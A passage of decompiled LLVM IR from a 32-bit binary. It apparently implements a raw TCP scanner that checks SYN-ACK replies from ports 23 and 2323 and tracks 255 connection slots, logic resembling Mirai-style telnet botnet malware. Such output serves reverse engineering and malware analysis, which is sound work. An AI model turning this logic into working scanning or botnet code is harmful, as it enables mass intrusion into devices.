  %v3_804de0e = load i32, i32* %v2_804de0e, align 4
  store i32 %v3_804de0e, i32* %eax.global-to-local, align 4
  %v1_804de12 = load i32, i32* @global_var_8053a7c.19, align 4
  %v12_804de12 = icmp eq i32 %v3_804de0e, %v1_804de12
  %v1_804de18 = icmp eq i1 %v12_804de12, false
  br i1 %v1_804de18, label %dec_label_pc_804ddc6, label %dec_label_pc_804de1a

dec_label_pc_804de1a:                             ; preds = %dec_label_pc_804de0e
  %v1_804de1a = add i32 %v0_804ddf1, 83
  %v2_804de1a = inttoptr i32 %v1_804de1a to i8*
  %v3_804de1a = load i8, i8* %v2_804de1a, align 1
  %v12_804de1a = icmp eq i8 %v3_804de1a, 6
  %v1_804de1f = icmp eq i1 %v12_804de1a, false
  br i1 %v1_804de1f, label %dec_label_pc_804ddc6, label %dec_label_pc_804de21

dec_label_pc_804de21:                             ; preds = %dec_label_pc_804de1a
  %v1_804de21 = add i32 %v0_804ddf1, 94
  %v2_804de21 = inttoptr i32 %v1_804de21 to i32*
  %v3_804de21 = load i32, i32* %v2_804de21, align 4
  store i32 %v3_804de21, i32* %esi.global-to-local, align 4
  %v1_804de25 = trunc i32 %v3_804de21 to i16
  %v7_804de25 = icmp ne i16 %v1_804de25, 5888
  %v10_804de2c = icmp eq i16 %v1_804de25, 4873
  %v1_804de31 = icmp eq i1 %v10_804de2c, false
  %or.cond163 = and i1 %v7_804de25, %v1_804de31
  br i1 %or.cond163, label %dec_label_pc_804ddc6, label %dec_label_pc_804de33

dec_label_pc_804de33:                             ; preds = %dec_label_pc_804de21
  %v1_804de33 = add i32 %v0_804ddf1, 46
  %v2_804de33 = inttoptr i32 %v1_804de33 to i16*
  %v3_804de33 = load i16, i16* %v2_804de33, align 2
  %v4_804de33 = zext i16 %v3_804de33 to i32
  %v6_804de33 = and i32 %v3_804de0e, -65536
  %v7_804de33 = or i32 %v4_804de33, %v6_804de33
  store i32 %v7_804de33, i32* %eax.global-to-local, align 4
  %v3_804de38 = add i32 %v0_804ddf1, 96
  %v4_804de38 = inttoptr i32 %v3_804de38 to i16*
  %v5_804de38 = load i16, i16* %v4_804de38, align 2
  %v16_804de38 = icmp eq i16 %v3_804de33, %v5_804de38
  %v1_804de3d = icmp eq i1 %v16_804de38, false
  br i1 %v1_804de3d, label %dec_label_pc_804ddc6, label %dec_label_pc_804de3f

dec_label_pc_804de3f:                             ; preds = %dec_label_pc_804de33
  %v1_804de3f = add i32 %v0_804ddf1, 107
  %v2_804de3f = inttoptr i32 %v1_804de3f to i8*
  %v3_804de3f = load i8, i8* %v2_804de3f, align 1
  %v4_804de3f = zext i8 %v3_804de3f to i32
  %v6_804de3f = and i32 %v7_804de33, -256
  %v7_804de3f = or i32 %v4_804de3f, %v6_804de3f
  store i32 %v7_804de3f, i32* %eax.global-to-local, align 4
  %v2_804de43 = and i8 %v3_804de3f, 2
  %v3_804de43 = icmp eq i8 %v2_804de43, 0
  %v2_804de4b = and i32 %v4_804de3f, 16
  %v3_804de4b = icmp eq i32 %v2_804de4b, 0
  %or.cond164 = or i1 %v3_804de43, %v3_804de4b
  br i1 %or.cond164, label %dec_label_pc_804ddc6, label %dec_label_pc_804de53

dec_label_pc_804de53:                             ; preds = %dec_label_pc_804de3f
  %v2_804de53 = and i32 %v4_804de3f, 4
  %v3_804de53 = icmp eq i32 %v2_804de53, 0
  %v1_804de55 = icmp eq i1 %v3_804de53, false
  br i1 %v1_804de55, label %dec_label_pc_804ddc6, label %dec_label_pc_804de5b

dec_label_pc_804de5b:                             ; preds = %dec_label_pc_804de53
  %tmp309 = urem i8 %v3_804de3f, 2
  %v3_804de5b = icmp eq i8 %tmp309, 0
  %v1_804de5d = icmp eq i1 %v3_804de5b, false
  br i1 %v1_804de5d, label %dec_label_pc_804ddc6, label %dec_label_pc_804de63

dec_label_pc_804de63:                             ; preds = %dec_label_pc_804de5b
  %v1_804de63 = add i32 %v0_804ddf1, 102
  %v2_804de63 = inttoptr i32 %v1_804de63 to i32*
  %v3_804de63 = load i32, i32* %v2_804de63, align 4
  %v1_804de67 = trunc i32 %v3_804de63 to i16
  %v2_804de67 = call i16 @llvm.bswap.i16(i16 %v1_804de67)
  %v3_804de67 = zext i16 %v2_804de67 to i32
  %v1_804de6b = udiv i32 %v3_804de63, 65536
  %v2_804de6b = mul nuw i32 %v3_804de67, 65536
  %v1_804de6e = trunc i32 %v1_804de6b to i16
  %v2_804de6e = call i16 @llvm.bswap.i16(i16 %v1_804de6e)
  %v3_804de6e = zext i16 %v2_804de6e to i32
  %v6_804de6e = or i32 %v3_804de6e, %v2_804de6b
  store i32 %v6_804de6e, i32* %eax.global-to-local, align 4
  %v1_804de72 = add i32 %v6_804de6e, -1
  %v1_804de75 = trunc i32 %v1_804de72 to i16
  %v2_804de75 = call i16 @llvm.bswap.i16(i16 %v1_804de75)
  %v3_804de75 = zext i16 %v2_804de75 to i32
  %v1_804de79 = udiv i32 %v1_804de72, 65536
  %v2_804de79 = mul nuw i32 %v3_804de75, 65536
  %v1_804de7c = trunc i32 %v1_804de79 to i16
  %v2_804de7c = call i16 @llvm.bswap.i16(i16 %v1_804de7c)
  %v3_804de7c = zext i16 %v2_804de7c to i32
  %v6_804de7c = or i32 %v3_804de7c, %v2_804de79
  store i32 %v6_804de7c, i32* %edx.global-to-local, align 4
  %v1_804de80 = add i32 %v0_804ddf1, 86
  %v2_804de80 = inttoptr i32 %v1_804de80 to i32*
  %v3_804de80 = load i32, i32* %v2_804de80, align 4
  %v15_804de80 = icmp eq i32 %v3_804de80, %v6_804de7c
  %v1_804de84 = icmp eq i1 %v15_804de80, false
  br i1 %v1_804de84, label %dec_label_pc_804ddc6, label %dec_label_pc_804de8a

dec_label_pc_804de8a:                             ; preds = %dec_label_pc_804de63
  %v0_804de8a = load i32, i32* @ebx, align 4
  %v1_804de8a = add i32 %v0_804de8a, -255
  %v6_804de8a = sub i32 254, %v0_804de8a
  %v7_804de8a = and i32 %v6_804de8a, %v0_804de8a
  %v8_804de8a = icmp slt i32 %v7_804de8a, 0
  %v9_804de8a = icmp eq i32 %v1_804de8a, 0
  %v10_804de8a = icmp slt i32 %v1_804de8a, 0
  %v3_804de90 = icmp eq i1 %v10_804de8a, %v8_804de8a
  %v4_804de90 = icmp eq i1 %v9_804de8a, false
  %v5_804de90 = and i1 %v4_804de90, %v3_804de90
  br i1 %v5_804de90, label %dec_label_pc_804ded6, label %dec_label_pc_804de92

dec_label_pc_804de92:                             ; preds = %dec_label_pc_804de8a
  %v0_804de95 = load i32, i32* @global_var_8053a98.21, align 8
  store i32 %v0_804de95, i32* %ecx.global-to-local, align 4
  %v2_804de9b = mul i32 %v0_804de8a, 288
  %v2_804de9e = add i32 %v0_804de95, %v2_804de9b
  store i32 %v2_804de9e, i32* @eax, align 4
  %v1_804dea0 = add i32 %v2_804de9e, 12
  %v2_804dea0 = inttoptr i32 %v1_804dea0 to i32*
  %v3_804dea0 = load i32, i32* %v2_804dea0, align 4
  %v1_804dea3 = add i32 %v2_804de9e, 288
  store i32 %v1_804dea3, i32* %ecx.global-to-local, align 4
  %v1_804dea9 = icmp eq i32 %v3_804dea0, 0
  br i1 %v1_804dea9, label %dec_label_pc_804dec5, label %dec_label_pc_804dead

dec_label_pc_804dead:                             ; preds = %dec_label_pc_804de92, %dec_label_pc_804deb6
  %v0_804deb6 = phi i32 [ %v1_804deb8, %dec_label_pc_804deb6 ], [ %v1_804dea3, %dec_label_pc_804de92 ]
  %v0_804dead = phi i32 [ %v1_804dead, %dec_label_pc_804deb6 ], [ %v0_804de8a, %dec_label_pc_804de92 ]
  %v1_804dead = add i32 %v0_804dead, 1
  store i32 %v1_804dead, i32* @ebx, align 4
  %v6_804deae = icmp eq i32 %v0_804dead, 255
  br i1 %v6_804deae, label %dec_label_pc_804ded6, label %dec_label_pc_804deb6

dec_label_pc_804deb6:                             ; preds = %dec_label_pc_804dead
  store i32 %v0_804deb6, i32* @eax, align 4
  %v1_804deb8 = add i32 %v0_804deb6, 288
  store i32 %v1_804deb8, i32* %ecx.global-to-local, align 4
  %v1_804debe = add i32 %v0_804deb6, 12
  %v2_804debe = inttoptr i32 %v1_804debe to i32*
  %v3_804debe = load i32, i32* %v2_804debe, align 4
  store i32 %v3_804debe, i32* @edi, align 4
  %v1_804dec1 = icmp eq i32 %v3_804debe, 0
  %v1_804dec3 = icmp eq i1 %v1_804dec1, false
  br i1 %v1_804dec3, label %dec_label_pc_804dead, label %dec_label_pc_804dec5

dec_label_pc_804dec5:                             ; preds = %dec_label_pc_804deb6, %dec_label_pc_804de92
  %v1_804dec5 = phi i32 [ %v2_804de9e, %dec_label_pc_804de92 ], [ %v0_804deb6, %dec_label_pc_804deb6 ]
  %v2_804dec5 = add i32 %v1_804dec5, 16
  %v3_804dec5 = inttoptr i32 %v2_804dec5 to i32*
  store i32 %v6_804de7c, i32* %v3_804dec5, align 4
  %v0_804dec8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dec8 = trunc i32 %v0_804dec8 to i16
  %v2_804dec8 = load i32, i32* @eax, align 4
  %v3_804dec8 = add i32 %v2_804dec8, 20
  %v4_804dec8 = inttoptr i32 %v3_804dec8 to i16*
  store i16 %v1_804dec8, i16* %v4_804dec8, align 2
  %v0_804decc = call i32 @function_804d580()
  store i32 %v0_804decc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddc6

dec_label_pc_804ded6:                             ; preds = %dec_label_pc_804de8a, %dec_label_pc_804ddfc, %dec_label_pc_804ddc6, %dec_label_pc_804dead
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804dedf = add i32 %v0_804ddf1, 36
  %v2_804dedf = inttoptr i32 %v1_804dedf to i32*
  %v3_804dedf = load i32, i32* %v2_804dedf, align 4
  %v4_804dedf = inttoptr i32 %v3_804dedf to i8*
  %v5_804dee4 = call i8* @_memset(i8* %v4_804dedf, i32 0, i32 32)
  %v0_804dee6 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804dee6, i32* %ecx.global-to-local, align 4
  %v0_804dee8 = load i32, i32* @esp, align 4
  %v1_804dee8 = inttoptr i32 %v0_804dee8 to i32*
  %v2_804dee8 = load i32, i32* %v1_804dee8, align 4
  %v3_804dee8 = inttoptr i32 %v2_804dee8 to i8*
  %v2_804deec = load i32, i32* %eax.global-to-local, align 4
  %v5_804deec = call i8* @_memset(i8* %v3_804dee8, i32 %v2_804deec, i32 %v0_804dee6)
  %v6_804deec = ptrtoint i8* %v5_804deec to i32
  store i32 %v6_804deec, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804def2 = load i32, i32* @esp, align 4
  %v1_804def2 = add i32 %v0_804def2, 1852
  %v2_804def2 = inttoptr i32 %v1_804def2 to i32*
  store i32 0, i32* %v2_804def2, align 4
  %v0_804df3d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df3d

dec_label_pc_804df00:                             ; preds = %dec_label_pc_804df57
  store i32 %v1_804df52, i32* %edx.global-to-local, align 4
  %v1_804dfaf = add i32 %v2_804df4d, 4
  %v2_804dfaf = inttoptr i32 %v1_804dfaf to i32*
  %v3_804dfaf = load i32, i32* %v2_804dfaf, align 4
  %v1_804dfb4 = urem i32 %v3_804dfaf, 32
  store i32 %v1_804dfb4, i32* %eax.global-to-local, align 4
  %v2_804dfb7 = udiv i32 %v3_804dfaf, 32
  store i32 %v2_804dfb7, i32* %edx.global-to-local, align 4
  %v0_804dfba = load i32, i32* @esp, align 4
  %v2_804dfba = mul nuw nsw i32 %v2_804dfb7, 4
  br i1 %v9_804df52, label %dec_label_pc_804dfaf, label %dec_label_pc_804df07

dec_label_pc_804df07:                             ; preds = %dec_label_pc_804df00
  %v3_804df12 = add nuw nsw i32 %v2_804dfba, 1684
  %v4_804df12 = add i32 %v3_804df12, %v0_804dfba
  %v5_804df12 = inttoptr i32 %v4_804df12 to i32*
  %v6_804df12 = load i32, i32* %v5_804df12, align 4
  %v9_804df12 = shl i32 1, %v1_804dfb4
  %v12_804df12 = or i32 %v6_804df12, %v9_804df12
  store i32 %v12_804df12, i32* %v5_804df12, align 4
  %v0_804df1a = load i32, i32* @ebx, align 4
  %v1_804df1a = add i32 %v0_804df1a, 4
  %v2_804df1a = inttoptr i32 %v1_804df1a to i32*
  %v3_804df1a = load i32, i32* %v2_804df1a, align 4
  store i32 %v3_804df1a, i32* %eax.global-to-local, align 4
  %v0_804df1d = load i32, i32* @edi, align 4
  %v2_804df1d = sub i32 %v0_804df1d, %v3_804df1a
  %v8_804df1d = xor i32 %v0_804df1d, %v3_804df1a
  %v9_804df1d = xor i32 %v2_804df1d, %v0_804df1d
  %v10_804df1d = and i32 %v9_804df1d, %v8_804df1d
  %v11_804df1d = icmp slt i32 %v10_804df1d, 0
  %v13_804df1d = icmp slt i32 %v2_804df1d, 0
  %v2_804df1f = icmp eq i1 %v13_804df1d, %v11_804df1d
  br i1 %v2_804df1f, label %dec_label_pc_804df23, label %dec_label_pc_804df21

dec_label_pc_804df21:                             ; preds = %dec_label_pc_804df07
  store i32 %v3_804df1a, i32* @edi, align 4
  br label %dec_label_pc_804df23

dec_label_pc_804df23:                             ; preds = %dec_label_pc_804dfaf, %dec_label_pc_804dfa3, %dec_label_pc_804df07, %dec_label_pc_804ebfc, %dec_label_pc_804dfcd, %dec_label_pc_804df9a, %dec_label_pc_804df21
  %v0_804df23 = load i32, i32* @esp, align 4
  %v1_804df23 = add i32 %v0_804df23, 1852
  %v2_804df23 = inttoptr i32 %v1_804df23 to i32*
  %v3_804df23 = load i32, i32* %v2_804df23, align 4
  %v1_804df2a = add i32 %v3_804df23, 1
  store i32 %v1_804df2a, i32* %eax.global-to-local, align 4
  store i32 %v1_804df2a, i32* %v2_804df23, align 4
  %v0_804df32 = load i32, i32* %eax.global-to-local, align 4
  %v1_804df32 = add i32 %v0_804df32, -255
  %v6_804df32 = sub i32 254, %v0_804df32
  %v7_804df32 = and i32 %v6_804df32, %v0_804df32
  %v8_804df32 = icmp slt i32 %v7_804df32, 0
  %v9_804df32 = icmp eq i32 %v1_804df32, 0
  %v10_804df32 = icmp slt i32 %v1_804df32, 0
  %v3_804df37 = icmp eq i1 %v10_804df32, %v8_804df32
  %v4_804df37 = icmp eq i1 %v9_804df32, false
  %v5_804df37 = and i1 %v4_804df37, %v3_804df37
  br i1 %v5_804df37, label %dec_label_pc_804dfef, label %dec_label_pc_804df3d

dec_label_pc_804df3d:                             ; preds = %dec_label_pc_804df23, %dec_label_pc_804ded6
  %v0_804df3d = phi i32 [ %v0_804df32, %dec_label_pc_804df23 ], [ %v0_804df3d.pre, %dec_label_pc_804ded6 ]
  %v0_804df40 = load i32, i32* @global_var_8053a98.21, align 8
  store i32 %v0_804df40, i32* %eax.global-to-local, align 4
  %v2_804df45 = mul i32 %v0_804df3d, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804df4d = add i32 %v0_804df40, %v2_804df45
  store i32 %v2_804df4d, i32* @ebx, align 4
  %v1_804df4f = add i32 %v2_804df4d, 12
  %v2_804df4f = inttoptr i32 %v1_804df4f to i32*
  %v3_804df4f = load i32, i32* %v2_804df4f, align 4
  store i32 %v3_804df4f, i32* %edx.global-to-local, align 4
  %v1_804df52 = add i32 %v3_804df4f, -1
  %v5_804df52 = icmp eq i32 %v3_804df4f, 0
  %v9_804df52 = icmp eq i32 %v1_804df52, 0
  %v2_804df55 = or i1 %v5_804df52, %v9_804df52
  br i1 %v2_804df55, label %dec_label_pc_804dfa3, label %dec_label_pc_804df57

dec_label_pc_804df57:                             ; preds = %dec_label_pc_804df3d, %dec_label_pc_804dfab
  %v1_804df61 = phi i32 [ 30, %dec_label_pc_804df3d ], [ 5, %dec_label_pc_804dfab ]
  %v0_804df57 = load i32, i32* @global_var_8053a50.9, align 16
  store i32 %v0_804df57, i32* %eax.global-to-local, align 4
  %v1_804df5c = add i32 %v2_804df4d, 8
  %v2_804df5c = inttoptr i32 %v1_804df5c to i32*
  %v3_804df5c = load i32, i32* %v2_804df5c, align 4
  %v2_804df5f = sub i32 %v0_804df57, %v3_804df5c
  store i32 %v2_804df5f, i32* %eax.global-to-local, align 4
  %tmp303 = icmp ugt i32 %v2_804df5f, %v1_804df61
  br i1 %tmp303, label %dec_label_pc_804df65, label %dec_label_pc_804df00

dec_label_pc_804df65:                             ; preds = %dec_label_pc_804df57
  %v0_804df65 = load i32, i32* @esp, align 4
  %v1_804df68 = add i32 %v2_804df4d, 4
  %v2_804df68 = inttoptr i32 %v1_804df68 to i32*
  %v3_804df68 = load i32, i32* %v2_804df68, align 4
  store i32 %v3_804df68, i32* %eax.global-to-local, align 4
  %v2_804df6b = add i32 %v0_804df65, -16
  %v3_804df6b = inttoptr i32 %v2_804df6b to i32*
  store i32 %v3_804df68, i32* %v3_804df6b, align 4
  %v1_804df6c = call i32 @function_804f8e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804df6c, i32* %eax.global-to-local, align 4
  %v0_804df74 = load i32, i32* @ebx, align 4
  %v1_804df74 = add i32 %v0_804df74, 4
  %v2_804df74 = inttoptr i32 %v1_804df74 to i32*
  store i32 -1, i32* %v2_804df74, align 4
  %v0_804df7b = load i32, i32* @ebx, align 4
  %v1_804df7b = add i32 %v0_804df7b, 12
  %v2_804df7b = inttoptr i32 %v1_804df7b to i32*
  %v3_804df7b = load i32, i32* %v2_804df7b, align 4
  %tmp304 = icmp ult i32 %v3_804df7b, 3
  br i1 %tmp304, label %dec_label_pc_804ebfc, label %dec_label_pc_804df85

dec_label_pc_804df85:                             ; preds = %dec_label_pc_804df65
  %v1_804df85 = add i32 %v0_804df7b, 284
  %v2_804df85 = inttoptr i32 %v1_804df85 to i8*
  %v3_804df85 = load i8, i8* %v2_804df85, align 1
  %v4_804df85 = zext i8 %v3_804df85 to i32
  %v6_804df85 = and i32 %v1_804df6c, -256
  %v7_804df85 = or i32 %v4_804df85, %v6_804df85
  %v1_804df8b = add i32 %v7_804df85, 1
  %v10_804df8b = trunc i32 %v1_804df8b to i8
  store i32 %v1_804df8b, i32* %eax.global-to-local, align 4
  store i8 %v10_804df8b, i8* %v2_804df85, align 1
  %v0_804df92 = load i32, i32* %eax.global-to-local, align 4
  %v1_804df92 = trunc i32 %v0_804df92 to i8
  %v10_804df92 = icmp eq i8 %v1_804df92, 10
  br i1 %v10_804df92, label %dec_label_pc_804ebfc, label %dec_label_pc_804df9a

dec_label_pc_804df9a:                             ; preds = %dec_label_pc_804df85
  %v0_804df9a = load i32, i32* @ebx, align 4
  store i32 %v0_804df9a, i32* @eax, align 4
  %v0_804df9c = call i32 @function_804d580()
  store i32 %v0_804df9c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df23

dec_label_pc_804dfa3:                             ; preds = %dec_label_pc_804df3d
  br i1 %v5_804df52, label %dec_label_pc_804df23, label %dec_label_pc_804dfab

dec_label_pc_804dfab:                             ; preds = %dec_label_pc_804dfa3
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804df57

dec_label_pc_804dfaf:                             ; preds = %dec_label_pc_804df00
  %v3_804dfba = add nuw nsw i32 %v2_804dfba, 1556
  %v4_804dfba = add i32 %v3_804dfba, %v0_804dfba
  %v5_804dfba = inttoptr i32 %v4_804dfba to i32*
  %v6_804dfba = load i32, i32* %v5_804dfba, align 4
  %v9_804dfba = shl i32 1, %v1_804dfb4
  %v12_804dfba = or i32 %v6_804dfba, %v9_804dfba
  store i32 %v12_804dfba, i32* %v5_804dfba, align 4
  %v0_804dfc2 = load i32, i32* @ebx, align 4
  %v1_804dfc2 = add i32 %v0_804dfc2, 4
  %v2_804dfc2 = inttoptr i32 %v1_804dfc2 to i32*
  %v3_804dfc2 = load i32, i32* %v2_804dfc2, align 4
  store i32 %v3_804dfc2, i32* %eax.global-to-local, align 4
  %v0_804dfc5 = load i32, i32* @esi, align 4
  %v2_804dfc5 = sub i32 %v0_804dfc5, %v3_804dfc2
  %v8_804dfc5 = xor i32 %v0_804dfc5, %v3_804dfc2
  %v9_804dfc5 = xor i32 %v2_804dfc5, %v0_804dfc5
  %v10_804dfc5 = and i32 %v9_804dfc5, %v8_804dfc5
  %v11_804dfc5 = icmp slt i32 %v10_804dfc5, 0
  %v13_804dfc5 = icmp slt i32 %v2_804dfc5, 0
  %v2_804dfc7 = icmp eq i1 %v13_804dfc5, %v11_804dfc5
  br i1 %v2_804dfc7, label %dec_label_pc_804df23, label %dec_label_pc_804dfcd

dec_label_pc_804dfcd:                             ; preds = %dec_label_pc_804dfaf
  store i32 %v3_804dfc2, i32* @esi, align 4
  br label %dec_label_pc_804df23

dec_label_pc_804dfef:                             ; preds = %dec_label_pc_804df23
  %v0_804dfef = load i32, i32* @esp, align 4
  %v1_804dfef = add i32 %v0_804dfef, 1844
  %v2_804dfef = inttoptr i32 %v1_804dfef to i32*
  store i32 0, i32* %v2_804dfef, align 4
  %v0_804dffa = load i32, i32* @esp, align 4
  %v1_804dffa = add i32 %v0_804dffa, 1840
  %v2_804dffa = inttoptr i32 %v1_804dffa to i32*
  store i32 1, i32* %v2_804dffa, align 4
  %v0_804e005 = load i32, i32* @esp, align 4
  %v0_804e008 = load i32, i32* @edi, align 4
  %v1_804e008 = load i32, i32* @esi, align 4
  %v2_804e008 = sub i32 %v0_804e008, %v1_804e008
  %v8_804e008 = xor i32 %v1_804e008, %v0_804e008
  %v9_804e008 = xor i32 %v2_804e008, %v0_804e008
  %v10_804e008 = and i32 %v9_804e008, %v8_804e008
  %v11_804e008 = icmp slt i32 %v10_804e008, 0
  %v13_804e008 = icmp slt i32 %v2_804e008, 0
  %v1_804e00a = add i32 %v0_804e005, 1840
  %v2_804e011 = add i32 %v0_804e005, -16
  %v3_804e011 = inttoptr i32 %v2_804e011 to i32*
  store i32 %v1_804e00a, i32* %v3_804e011, align 4
  %v1_804e012 = add i32 %v0_804e005, -20
  %v2_804e012 = inttoptr i32 %v1_804e012 to i32*
  store i32 0, i32* %v2_804e012, align 4
  %v1_804e014 = add i32 %v0_804e005, 1556
  store i32 %v1_804e014, i32* %edx.global-to-local, align 4
  %v0_804e01b = load i32, i32* @edi, align 4
  store i32 %v0_804e01b, i32* %eax.global-to-local, align 4
  %v2_804e01d = add i32 %v0_804e005, -24
  %v3_804e01d = inttoptr i32 %v2_804e01d to i32*
  store i32 %v1_804e014, i32* %v3_804e01d, align 4
  %v1_804e01e = add i32 %v0_804e005, 1684
  store i32 %v1_804e01e, i32* %ecx.global-to-local, align 4
  %v2_804e025 = add i32 %v0_804e005, -28
  %v3_804e025 = inttoptr i32 %v2_804e025 to i32*
  store i32 %v1_804e01e, i32* %v3_804e025, align 4
  %v2_804e026 = icmp eq i1 %v13_804e008, %v11_804e008
  br i1 %v2_804e026, label %dec_label_pc_804dfef.dec_label_pc_804e02a_crit_edge, label %dec_label_pc_804e028

dec_label_pc_804dfef.dec_label_pc_804e02a_crit_edge: ; preds = %dec_label_pc_804dfef
  %v0_804e02a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e02a

dec_label_pc_804e028:                             ; preds = %dec_label_pc_804dfef
  %v0_804e028 = load i32, i32* @esi, align 4
  store i32 %v0_804e028, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e02a

dec_label_pc_804e02a:                             ; preds = %dec_label_pc_804dfef.dec_label_pc_804e02a_crit_edge, %dec_label_pc_804e028
  %v0_804e02a = phi i32 [ %v0_804e02a.pre, %dec_label_pc_804dfef.dec_label_pc_804e02a_crit_edge ], [ %v0_804e028, %dec_label_pc_804e028 ]
  %v1_804e02a = add i32 %v0_804e02a, 1
  store i32 %v1_804e02a, i32* %eax.global-to-local, align 4
  %v2_804e02b = add i32 %v0_804e005, -32
  %v3_804e02b = inttoptr i32 %v2_804e02b to i32*
  store i32 %v1_804e02a, i32* %v3_804e02b, align 4
  %v0_804e02c = call i32 @function_804faea()
  store i32 %v0_804e02c, i32* %eax.global-to-local, align 4
  %v0_804e031 = load i32, i32* @esp, align 4
  %v1_804e034 = add i32 %v0_804e031, 16
  %v2_804e034 = inttoptr i32 %v1_804e034 to i32*
  store i32 0, i32* %v2_804e034, align 4
  %v0_804e036 = call i32 @function_804fba4()
  %v0_804e03b = load i32, i32* @esp, align 4
  %v1_804e03b = add i32 %v0_804e03b, 1868
  %v2_804e03b = inttoptr i32 %v1_804e03b to i32*
  store i32 0, i32* %v2_804e03b, align 4
  store i32 %v0_804e036, i32* @global_var_8053a50.9, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e06c

dec_label_pc_804e052:                             ; preds = %dec_label_pc_804e0b5.backedge, %dec_label_pc_804e0b5.preheader, %dec_label_pc_804e562, %dec_label_pc_804e06c, %dec_label_pc_804e09e, %dec_label_pc_804ec1e, %dec_label_pc_804eb19, %dec_label_pc_804e59a
  %v0_804e052 = load i32, i32* @esp, align 4
  %v1_804e052 = add i32 %v0_804e052, 1852
  %v2_804e052 = inttoptr i32 %v1_804e052 to i32*
  %v3_804e052 = load i32, i32* %v2_804e052, align 4
  %v1_804e059 = add i32 %v3_804e052, 1
  store i32 %v1_804e059, i32* %eax.global-to-local, align 4
  store i32 %v1_804e059, i32* %v2_804e052, align 4
  %v0_804e061 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e061 = add i32 %v0_804e061, -255
  %v6_804e061 = sub i32 254, %v0_804e061
  %v7_804e061 = and i32 %v6_804e061, %v0_804e061
  %v8_804e061 = icmp slt i32 %v7_804e061, 0
  %v9_804e061 = icmp eq i32 %v1_804e061, 0
  %v10_804e061 = icmp slt i32 %v1_804e061, 0
  %v3_804e066 = icmp eq i1 %v10_804e061, %v8_804e061
  %v4_804e066 = icmp eq i1 %v9_804e061, false
  %v5_804e066 = and i1 %v4_804e066, %v3_804e066
  br i1 %v5_804e066, label %.loopexit, label %dec_label_pc_804e06c

dec_label_pc_804e06c:                             ; preds = %dec_label_pc_804e052, %dec_label_pc_804e02a
  %v0_804e06c = phi i32 [ %v0_804e061, %dec_label_pc_804e052 ], [ 0, %dec_label_pc_804e02a ]
  %v0_804e06f = load i32, i32* @global_var_8053a98.21, align 8
  store i32 %v0_804e06f, i32* %eax.global-to-local, align 4
  %v2_804e074 = mul i32 %v0_804e06c, 288
  %v2_804e077 = add i32 %v0_804e06f, %v2_804e074
  store i32 %v2_804e077, i32* @edi, align 4
  %v1_804e079 = add i32 %v2_804e077, 4
  %v2_804e079 = inttoptr i32 %v1_804e079 to i32*
  %v3_804e079 = load i32, i32* %v2_804e079, align 4
  store i32 %v3_804e079, i32* %ecx.global-to-local, align 4
  %v10_804e07c = icmp eq i32 %v3_804e079, -1
  br i1 %v10_804e07c, label %dec_label_pc_804e052, label %dec_label_pc_804e081

dec_label_pc_804e081:                             ; preds = %dec_label_pc_804e06c
  %v2_804e085 = udiv i32 %v3_804e079, 32
  store i32 %v2_804e085, i32* %edx.global-to-local, align 4
  %v1_804e088 = urem i32 %v3_804e079, 32
  store i32 %v1_804e088, i32* %eax.global-to-local, align 4
  %v0_804e08b = load i32, i32* @esp, align 4
  %v2_804e08b = mul nuw nsw i32 %v2_804e085, 4
  %v3_804e08b = add nuw nsw i32 %v2_804e08b, 1556
  %v4_804e08b = add i32 %v3_804e08b, %v0_804e08b
  %v5_804e08b = inttoptr i32 %v4_804e08b to i32*
  %v6_804e08b = load i32, i32* %v5_804e08b, align 4
  %v9_804e08b = shl i32 1, %v1_804e088
  %v10_804e08b = and i32 %v6_804e08b, %v9_804e08b
  %v11_804e08b = icmp ne i32 %v10_804e08b, 0
  %v1_804e093 = zext i1 %v11_804e08b to i32
  store i32 %v1_804e093, i32* %eax.global-to-local, align 4
  %v4_804e096 = icmp eq i1 %v11_804e08b, false
  %v1_804e098 = icmp eq i1 %v4_804e096, false
  br i1 %v1_804e098, label %dec_label_pc_804ea76, label %dec_label_pc_804e09e

dec_label_pc_804e09e:                             ; preds = %dec_label_pc_804e081, %dec_label_pc_804eb08
  %v0_804e0a6 = phi i32 [ %v0_804e08b, %dec_label_pc_804e081 ], [ %v0_804e0a6.pre, %dec_label_pc_804eb08 ]
  %v0_804e09e = phi i32 [ %v3_804e079, %dec_label_pc_804e081 ], [ %v0_804e09e.pre, %dec_label_pc_804eb08 ]
  %v2_804e0a0 = udiv i32 %v0_804e09e, 32
  store i32 %v2_804e0a0, i32* %ecx.global-to-local, align 4
  %v1_804e0a3 = urem i32 %v0_804e09e, 32
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v2_804e0a6 = mul nuw nsw i32 %v2_804e0a0, 4
  %v3_804e0a6 = add i32 %v0_804e0a6, 1684
  %v4_804e0a6 = add i32 %v3_804e0a6, %v2_804e0a6
  %v5_804e0a6 = inttoptr i32 %v4_804e0a6 to i32*
  %v6_804e0a6 = load i32, i32* %v5_804e0a6, align 4
  %v9_804e0a6 = shl i32 1, %v1_804e0a3
  %v10_804e0a6 = and i32 %v6_804e0a6, %v9_804e0a6
  %v11_804e0a6 = icmp ne i32 %v10_804e0a6, 0
  %v1_804e0ae = zext i1 %v11_804e0a6 to i32
  store i32 %v1_804e0ae, i32* %eax.global-to-local, align 4
  %v4_804e0b1 = icmp eq i1 %v11_804e0a6, false
  br i1 %v4_804e0b1, label %dec_label_pc_804e052, label %dec_label_pc_804e0b5.preheader

dec_label_pc_804e0b5.preheader:                   ; preds = %dec_label_pc_804e09e
  %v0_804e0b526 = load i32, i32* @edi, align 4
  %v1_804e0b527 = add i32 %v0_804e0b526, 12
